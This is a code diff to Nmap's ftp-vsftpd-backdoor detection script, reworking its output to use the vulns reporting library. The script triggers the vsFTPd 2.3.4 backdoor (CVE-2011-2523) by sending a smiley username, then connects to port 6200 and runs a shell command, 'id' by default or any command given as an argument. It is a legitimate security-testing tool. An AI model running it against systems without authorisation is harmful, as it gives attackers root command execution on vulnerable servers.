@@ -21,10 +21,24 @@ References:
 -- @output
 -- PORT   STATE SERVICE
 -- 21/tcp open  ftp
--- | ftp-vsftpd-backdoor:
--- |   This installation has been backdoored (CVE-2011-2523): VULNERABLE
--- |     Shell command: id
--- |_    Results: uid=0(root) gid=0(root) groups=0(root)
+-- | ftp-vsftpd-backdoor: 
+-- |   VULNERABLE:
+-- |   vsFTPd version 2.3.4 backdoor
+-- |     State: VULNERABLE (Exploitable)
+-- |     IDs:  CVE:CVE-2011-2523  OSVDB:73573
+-- |     Description:
+-- |       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
+-- |     Disclosure date: 2011-07-03
+-- |     Exploit results:
+-- |       The backdoor was already triggered
+-- |       Shell command: id
+-- |       Results: uid=0(root) gid=0(root) groups=0(root)
+-- |     References:
+-- |       http://osvdb.org/73573
+-- |       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
+-- |       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
+-- |_      https://dev.metasploit.com/redmine/projects/framework/repository/revisions/13093
+--
 
 author = "Daniel Miller"
 license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
@@ -34,6 +48,7 @@ require("ftp")
 require("nmap")
 require("shortport")
 require("stdnse")
+require("vulns")
 
 local CMD_FTP = "USER X:)\r\nPASS X\r\n"
 local CMD_SHELL_ID = "id"
@@ -60,15 +75,16 @@ local function finish_ftp(socket, status, message)
 end
 
 -- Returns true, results  if vsFTPd was backdoored
-local function check_backdoor(host, shell_cmd)
+local function check_backdoor(host, shell_cmd, vuln)
   local socket = nmap.new_socket("tcp")
   socket:set_timeout(10000)
   
   local status, ret = socket:connect(host, 6200, "tcp")
   if not status then
-    return finish_ftp(socket, false,
-            string.format("can't connect to tcp port 6200: NOT VULNERABLE ",
-                          ret))
+    stdnse.print_debug(3, "%s: can't connect to tcp port 6200: NOT VULNERABLE",
+        SCRIPT_NAME)
+    vuln.state = vulns.STATE.NOT_VULN
+    return finish_ftp(socket, true)
   end
 
   status, ret = socket:send(CMD_SHELL_ID.."\n")
@@ -84,8 +100,11 @@ local function check_backdoor(host, shell_cmd)
   end
 
   if not ret:match("uid=") then
-    return finish_ftp(socket, false,
-          "service on port 6200 is not the vsFTPd backdoor: NOT VULNERABLE")
+    stdnse.print_debug(3,
+        "%s: service on port 6200 is not the vsFTPd backdoor: NOT VULNERABLE",
+        SCRIPT_NAME)
+    vuln.state = vulns.STATE.NOT_VULN
+    return finish_ftp(socket, true)
   else
     if shell_cmd ~= CMD_SHELL_ID then
       status, ret = socket:send(shell_cmd.."\n")
@@ -102,8 +121,15 @@ local function check_backdoor(host, shell_cmd)
       socket:send("exit\n");
     end
   end
+ 
+  vuln.state = vulns.STATE.EXPLOIT
+  table.insert(vuln.exploit_results,
+      string.format("Shell command: %s", shell_cmd))
+  local result = string.gsub(ret, "^%s*(.-)\n*$", "%1")
+  table.insert(vuln.exploit_results,
+      string.format("Results: %s", result))
 
-  return finish_ftp(socket, true, string.gsub(ret, "^%s*(.-)\n*$", "%1"))
+  return finish_ftp(socket, true) 
 end
 
 action = function(host, port)
@@ -111,17 +137,26 @@ action = function(host, port)
   local cmd = stdnse.get_script_args("ftp-vsftpd-backdoor.cmd") or
                 stdnse.get_script_args("exploit.cmd") or CMD_SHELL_ID
 
-  local results = {
-    "This installation has been backdoored (CVE-2011-2523): VULNERABLE",
-    "  Shell command: " .. cmd,
+  local vsftp_vuln = {
+    title = "vsFTPd version 2.3.4 backdoor",
+    IDS = {CVE = 'CVE-2011-2523', OSVDB = '73573'},
+    description = [[
+vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.]],
+    references = {
+'http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html',
+'https://dev.metasploit.com/redmine/projects/framework/repository/revisions/13093',
+    },
+    dates = {
+      disclosure = {year = '2011', month = '07', day = '03'},
+    },
+    exploit_results = {},
   }
+  local report = vulns.Report:new(SCRIPT_NAME, host, port)
 
   -- check to see if the vsFTPd backdoor was already triggered
-  local status, ret = check_backdoor(host, cmd)
+  local status, ret = check_backdoor(host, cmd, vsftp_vuln)
   if status then
-    table.insert(results, 2, "The backdoor was already triggered")
-    table.insert(results, string.format("  Results: %s", ret))
-    return stdnse.format_output(true, results)
+    return report:make_output(vsftp_vuln)
   end
 
   -- Create socket.
@@ -153,7 +188,7 @@ action = function(host, port)
 
   stdnse.sleep(1)
   -- check if vsFTPd was backdoored
-  status, ret = check_backdoor(host, cmd)
+  status, ret = check_backdoor(host, cmd, vsftp_vuln)
   if not status then
     stdnse.print_debug(1, "%s: %s", SCRIPT_NAME, ret)
     return nil
@@ -161,6 +196,5 @@ action = function(host, port)
 
   -- delay ftp socket cleaning
   sock:close()
-  table.insert(results, string.format("  Results: %s", ret))
-  return stdnse.format_output(true, results)
+  return report:make_output(vsftp_vuln)
 end
